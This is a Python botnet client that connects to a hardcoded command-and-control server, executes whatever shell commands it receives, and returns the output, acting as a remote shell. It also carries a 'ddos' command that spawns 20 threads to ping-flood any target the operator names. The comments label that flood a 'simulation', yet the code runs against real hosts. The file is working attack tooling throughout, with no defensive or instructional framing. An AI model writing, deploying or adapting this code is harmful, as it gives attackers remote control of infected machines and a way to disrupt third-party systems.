import socket
import subprocess
import threading
import time
import os

# Replace with your C2 server's IP address
SERVER_IP = '192.168.10.110'
PORT = 9999

try:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SERVER_IP, PORT))

    while True:
        command = client.recv(1024).decode()

        if command.lower() in ['exit', 'quit']:
            break

        # DDoS Command Simulation
        elif command.startswith("ddos"):
            parts = command.split()
            if len(parts) < 3:
                output = "[!] Usage: ddos <target_ip> <duration_in_seconds>"
            else:
                target = parts[1]
                try:
                    duration = int(parts[2])
                    timeout = time.time() + duration

                    def flood():
                        while time.time() < timeout:
                            os.system(f"ping -c 1 {target} > /dev/null")

                    threads = []
                    for _ in range(20):  # Simulate 20 threads
                        t = threading.Thread(target=flood)
                        t.start()
                        threads.append(t)

                    for t in threads:
                        t.join()

                    output = f"[+] DDoS simulation to {target} completed for {duration} seconds."
                except Exception as e:
                    output = f"[!] Error in DDoS command: {e}"

            client.send(output.encode())

        # Shell Command Execution
        else:
            try:
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = process.communicate()
                output = stdout.decode() + stderr.decode()

                if output.strip() == "":
                    output = "[+] Command executed successfully but returned no output."

            except Exception as e:
                output = f"[!] Error executing command: {str(e)}"

            client.send(output.encode())

    client.close()

except Exception as e:
    print(f"[!] Failed to connect to server: {e}")
